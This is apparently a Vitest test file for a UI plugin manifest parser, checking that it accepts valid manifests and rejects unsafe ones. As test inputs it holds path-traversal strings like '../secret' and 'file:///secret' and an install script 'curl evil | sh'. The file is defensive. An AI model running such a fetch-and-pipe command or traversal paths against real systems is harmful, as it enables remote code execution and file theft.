import { parseUiPluginManifestV1 } from "@doolittle/contracts/ui-plugin";
import { describe, expect, it } from "vitest";

const manifest = {
  kind: "doolittle.ui-plugin",
  manifestVersion: 1,
  id: "example",
  name: "Example",
  description: "An isolated local interface.",
  pluginVersion: "1.0.0",
  trustTier: "community-static",
  compatibility: { uiHostMajor: 1, uiPackageMajor: 0 },
  entry: "index.html",
  assets: [{ path: "index.html", bytes: 50, sha256: "a".repeat(64) }],
  requestedCapabilities: ["conversation.read"],
  contributions: { workspaces: [], panels: [] },
};

describe("UI artifact manifests", () => {
  it("validates both tiers without treating declared hashes as approval", () => {
    expect(parseUiPluginManifestV1(manifest).trustTier).toBe(
      "community-static",
    );
    expect(
      parseUiPluginManifestV1({
        ...manifest,
        trustTier: "trusted-react",
        entry: "renderer.mjs",
        assets: [{ ...manifest.assets[0], path: "renderer.mjs" }],
      }).trustTier,
    ).toBe("trusted-react");
  });
  it.each([
    "../secret",
    "/absolute.html",
    "foo/../index.html",
    "foo//index.html",
    "index.html?secret",
    "file:///secret",
    "index%2ehtml",
  ])("rejects an unsafe asset path %s", (path) => {
    expect(() =>
      parseUiPluginManifestV1({
        ...manifest,
        entry: path,
        assets: [{ ...manifest.assets[0], path }],
      }),
    ).toThrow();
  });
  it("rejects unsupported versions, undeclared entry points, duplicate assets and unknown capabilities", () => {
    for (const change of [
      { manifestVersion: 2 },
      { compatibility: { uiHostMajor: 2, uiPackageMajor: 0 } },
      { entry: "other.html" },
      { assets: [...manifest.assets, ...manifest.assets] },
      { requestedCapabilities: ["credentials.read"] },
      { installScript: "curl evil | sh" },
    ]) {
      expect(() =>
        parseUiPluginManifestV1({ ...manifest, ...change }),
      ).toThrow();
    }
  });
  it("rejects duplicate contribution IDs and excessive aggregate bytes", () => {
    expect(() =>
      parseUiPluginManifestV1({
        ...manifest,
        contributions: {
          workspaces: [{ id: "same", title: "One" }],
          panels: [{ id: "same", title: "Two" }],
        },
      }),
    ).toThrow();
    expect(() =>
      parseUiPluginManifestV1({
        ...manifest,
        assets: ["index.html", "one.js", "two.js"].map((path) => ({
          path,
          bytes: 16 * 1024 * 1024,
          sha256: "a".repeat(64),
        })),
      }),
    ).toThrow();
  });
});
